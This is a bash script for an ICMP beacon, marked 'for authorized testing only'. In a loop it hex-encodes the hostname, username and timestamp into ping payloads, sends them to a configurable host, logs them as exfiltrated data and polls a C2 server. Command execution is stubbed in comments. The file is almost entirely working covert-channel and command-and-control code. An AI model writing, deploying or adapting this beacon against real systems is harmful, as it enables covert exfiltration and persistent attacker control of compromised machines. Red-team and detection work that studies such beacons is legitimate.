#!/bin/bash
# Enhanced ICMP Beacon with Logging - FOR AUTHORIZED TESTING ONLY
# Usage: ./icmp_beacon_advanced.sh

# ===== CONFIGURATION =====
TARGET="0.0.0.0"      # Only YOUR authorized target
INTERVAL=5                  # Beacon interval in seconds
C2_SERVER="0.0.0.0"    # Your controlled C2 server
LOG_DIR="/tmp/icmp_beacon"
LOG_FILE="$LOG_DIR/beacon.log"
DATA_LOG="$LOG_DIR/exfiltrated_data.log"
ERROR_LOG="$LOG_DIR/errors.log"

# ===== INITIALIZATION =====
# Create log directory if it doesn't exist
mkdir -p "$LOG_DIR"

# Initialize log files with headers
echo "=========================================" | tee -a "$LOG_FILE"
echo "ICMP Beacon Started: $(date '+%Y-%m-%d %H:%M:%S')" | tee -a "$LOG_FILE"
echo "Target IP: $TARGET" | tee -a "$LOG_FILE"
echo "Interval: ${INTERVAL} seconds" | tee -a "$LOG_FILE"
echo "=========================================" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

# Counter for beacon attempts
BEACON_COUNT=0
SUCCESS_COUNT=0
FAIL_COUNT=0

# ===== FUNCTION: Log with timestamp =====
log_message() {
    local level="$1"  # INFO, SUCCESS, ERROR, DATA
    local message="$2"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    case "$level" in
        "INFO")
            echo "[$timestamp] [INFO] $message" | tee -a "$LOG_FILE"
            ;;
        "SUCCESS")
            echo "[$timestamp] [✓ SUCCESS] $message" | tee -a "$LOG_FILE"
            ;;
        "ERROR")
            echo "[$timestamp] [✗ ERROR] $message" | tee -a "$LOG_FILE"
            ;;
        "DATA")
            echo "[$timestamp] [DATA] $message" | tee -a "$DATA_LOG"
            echo "[$timestamp] [DATA] $message" | tee -a "$LOG_FILE"
            ;;
        *)
            echo "[$timestamp] $message" | tee -a "$LOG_FILE"
            ;;
    esac
}

# ===== FUNCTION: Send ICMP beacon with data =====
send_beacon() {
    local hostname=$(hostname)
    local user=$(whoami)
    local pid=$$
    local timestamp_epoch=$(date +%s)
    local packet_id=$BEACON_COUNT
    
    # Create payload (limited to 56 bytes to fit within 64 byte ICMP limit)
    # Format: ID|HOSTNAME|USER|TIMESTAMP
    local raw_data="$packet_id|$hostname|$user|$timestamp_epoch"
    local data_length=${#raw_data}
    
    log_message "INFO" "Preparing beacon #$BEACON_COUNT"
    log_message "INFO" "  Payload: $raw_data"
    log_message "INFO" "  Payload size: $data_length bytes"
    
    # Convert to hex for ping -p option
    local hex_payload=$(echo -n "$raw_data" | xxd -p | cut -c1-112)  # Max 56 bytes in hex (112 chars)
    
    # Send ICMP packet with embedded data
    if ping -c 1 -W 2 -p "$hex_payload" "$TARGET" > /dev/null 2>&1; then
        SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
        log_message "SUCCESS" "Beacon #$BEACON_COUNT sent successfully to $TARGET"
        log_message "DATA" "EXFIL|$timestamp_epoch|$packet_id|$hostname|$user"
        return 0
    else
        FAIL_COUNT=$((FAIL_COUNT + 1))
        log_message "ERROR" "Beacon #$BEACON_COUNT failed - $TARGET unreachable"
        echo "$(date '+%Y-%m-%d %H:%M:%S')|FAIL|$packet_id|$TARGET" >> "$ERROR_LOG"
        return 1
    fi
}

# ===== FUNCTION: Check for commands from C2 (placeholder) =====
check_c2_commands() {
    log_message "INFO" "Checking for C2 commands from $C2_SERVER..."
    
    # This is a placeholder - real implementation would:
    # 1. Receive ICMP responses
    # 2. Parse command data from ping replies
    # 3. Execute commands if received
    
    # Example of parsing ping response (simplified)
    local response=$(ping -c 1 -W 1 "$C2_SERVER" 2>/dev/null | grep "bytes from")
    
    if [ ! -z "$response" ]; then
        log_message "INFO" "C2 server responded - checking for commands"
        # Parse command from response (custom implementation needed)
        # local command=$(echo "$response" | extract_command_from_icmp)
        # if [ ! -z "$command" ]; then
        #     log_message "INFO" "Received command: $command"
        #     # Execute command safely
        # fi
    fi
}

# ===== FUNCTION: Show real-time statistics =====
show_stats() {
    local runtime=$(($(date +%s) - START_TIME))
    local success_rate=0
    
    if [ $BEACON_COUNT -gt 0 ]; then
        success_rate=$((SUCCESS_COUNT * 100 / BEACON_COUNT))
    fi
    
    echo ""
    echo "=========================================" | tee -a "$LOG_FILE"
    echo "STATISTICS (Runtime: ${runtime}s)" | tee -a "$LOG_FILE"
    echo "  Total Beacons: $BEACON_COUNT" | tee -a "$LOG_FILE"
    echo "  Successful: $SUCCESS_COUNT" | tee -a "$LOG_FILE"
    echo "  Failed: $FAIL_COUNT" | tee -a "$LOG_FILE"
    echo "  Success Rate: ${success_rate}%" | tee -a "$LOG_FILE"
    echo "  Log file: $LOG_FILE" | tee -a "$LOG_FILE"
    echo "  Data log: $DATA_LOG" | tee -a "$LOG_FILE"
    echo "  Error log: $ERROR_LOG" | tee -a "$LOG_FILE"
    echo "=========================================" | tee -a "$LOG_FILE"
    echo ""
}

# ===== FUNCTION: Cleanup on exit =====
cleanup() {
    echo ""
    log_message "INFO" "Received interrupt signal. Shutting down..."
    show_stats
    log_message "INFO" "ICMP Beacon stopped at $(date '+%Y-%m-%d %H:%M:%S')"
    echo "=========================================" | tee -a "$LOG_FILE"
    exit 0
}

# ===== MAIN EXECUTION =====
# Set trap for Ctrl+C
trap cleanup SIGINT SIGTERM

# Record start time
START_TIME=$(date +%s)

log_message "INFO" "ICMP Beacon service starting..."
log_message "INFO" "System: $(uname -a)"
log_message "INFO" "Hostname: $(hostname)"
log_message "INFO" "Current user: $(whoami)"
log_message "INFO" "Interface info:"
ip addr show 2>/dev/null | grep "inet " | grep -v "127.0.0.1" | while read line; do
    log_message "INFO" "  $line"
done

echo ""
log_message "INFO" "Press Ctrl+C to stop beaconing"
echo ""

# Main beacon loop
while true; do
    BEACON_COUNT=$((BEACON_COUNT + 1))
    
    # Send beacon with system data
    send_beacon
    
    # Check for C2 commands (every 5 beacons to reduce traffic)
    if [ $((BEACON_COUNT % 5)) -eq 0 ]; then
        check_c2_commands
    fi
    
    # Show stats every 10 beacons
    if [ $((BEACON_COUNT % 10)) -eq 0 ]; then
        show_stats
    fi
    
    # Wait for next beacon interval
    sleep $INTERVAL
done